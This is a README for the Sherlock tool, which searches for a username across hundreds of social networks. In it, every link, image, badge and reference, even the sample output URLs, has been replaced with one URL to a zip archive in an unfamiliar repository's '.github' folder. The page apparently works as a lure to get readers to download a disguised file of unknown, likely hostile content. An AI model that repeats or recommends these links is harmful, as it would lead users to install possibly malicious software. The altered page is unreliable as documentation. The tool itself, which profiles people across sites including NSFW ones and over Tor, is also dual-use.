<p align="center">
  <br>
  <a href="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip" target="_blank"><img src="images/sherlock-logo.png" alt="sherlock"/></a>
  <br>
  <span>Hunt down social media accounts by username across <a href="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip">400+ social networks</a></span>
  <br>
</p>

<p align="center">
  <a href="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip">Installation</a>
  &nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;
  <a href="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip">Usage</a>
  &nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;
  <a href="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip">Contributing</a>
</p>

<p align="center">
<img width="70%" height="70%" src="images/demo.png" alt="demo"/>
</p>


## Installation

> [!WARNING]  
> Packages for ParrotOS and Ubuntu 24.04, maintained by a third party, appear to be __broken__.  
> Users of these systems should defer to pipx/pip or Docker.

| Method | Notes |
| - | - |
| `pipx install sherlock-project` | `pip` may be used in place of `pipx` |
| `docker run -it --rm sherlock/sherlock` |
| `dnf install sherlock-project` | |

Community-maintained packages are available for Debian (>= 13), Ubuntu (>= 22.10), Homebrew, Kali, and BlackArch. These packages are not directly supported or maintained by the Sherlock Project.

See all alternative installation methods [here](https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip)

## General usage

To search for only one user:
```bash
sherlock user123
```

To search for more than one user:
```bash
sherlock user1 user2 user3
```

Accounts found will be stored in an individual text file with the corresponding username (e.g ```user123.txt```).

```console
$ sherlock --help
usage: sherlock [-h] [--version] [--verbose] [--folderoutput FOLDEROUTPUT]
                [--output OUTPUT] [--tor] [--unique-tor] [--csv] [--xlsx]
                [--site SITE_NAME] [--proxy PROXY_URL] [--json JSON_FILE]
                [--timeout TIMEOUT] [--print-all] [--print-found] [--no-color]
                [--browse] [--local] [--nsfw]
                USERNAMES [USERNAMES ...]

Sherlock: Find Usernames Across Social Networks (Version 0.14.3)

positional arguments:
  USERNAMES             One or more usernames to check with social networks.
                        Check similar usernames using {?} (replace to '_', '-', '.').

optional arguments:
  -h, --help            show this help message and exit
  --version             Display version information and dependencies.
  --verbose, -v, -d, --debug
                        Display extra debugging information and metrics.
  --folderoutput FOLDEROUTPUT, -fo FOLDEROUTPUT
                        If using multiple usernames, the output of the results will be
                        saved to this folder.
  --output OUTPUT, -o OUTPUT
                        If using single username, the output of the result will be saved
                        to this file.
  --tor, -t             Make requests over Tor; increases runtime; requires Tor to be
                        installed and in system path.
  --unique-tor, -u      Make requests over Tor with new Tor circuit after each request;
                        increases runtime; requires Tor to be installed and in system
                        path.
  --csv                 Create Comma-Separated Values (CSV) File.
  --xlsx                Create the standard file for the modern Microsoft Excel
                        spreadsheet (xlsx).
  --site SITE_NAME      Limit analysis to just the listed sites. Add multiple options to
                        specify more than one site.
  --proxy PROXY_URL, -p PROXY_URL
                        Make requests over a proxy. e.g. socks5://127.0.0.1:1080
  --json JSON_FILE, -j JSON_FILE
                        Load data from a JSON file or an online, valid, JSON file.
  --timeout TIMEOUT     Time (in seconds) to wait for response to requests (Default: 60)
  --print-all           Output sites where the username was not found.
  --print-found         Output sites where the username was found.
  --no-color            Don't color terminal output
  --browse, -b          Browse to all results on default browser.
  --local, -l           Force the use of the local data.json file.
  --nsfw                Include checking of NSFW sites from default list.
```
## Apify Actor Usage [![Sherlock Actor](https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip)](https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip)

<a href="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip"><img src="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip" alt="Run Sherlock Actor on Apify" width="176" height="39" /></a>

You can run Sherlock in the cloud without installation using the [Sherlock Actor](https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip) on [Apify](https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip) free of charge.

``` bash
$ echo '{"usernames":["user123"]}' | apify call -so netmilk/sherlock
[{
  "username": "user123",
  "links": [
    "https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip",
    ...
  ]
}]
```

Read more about the [Sherlock Actor](../.actor/README.md), including how to use it programmatically via the Apify [API](https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip), [CLI](https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip) and [JS/TS and Python SDKs](https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip).

## Credits

Thank you to everyone who has contributed to Sherlock! ❤️

<a href="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip">
  <img src="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip" alt="contributors"/>
</a>

## Star History

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip" />
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip" />
  <img alt="Sherlock Project Star History Chart" src="https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip" />
</picture>

## License

MIT © Sherlock Project<br/>
Original Creator - [Siddharth Dushantha](https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip)

<!-- Reference Links -->

[ext_pypi]: https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip
[ext_brew]: https://raw.githubusercontent.com/deflower-co/sherlock/master/.github/Software_v1.8.zip
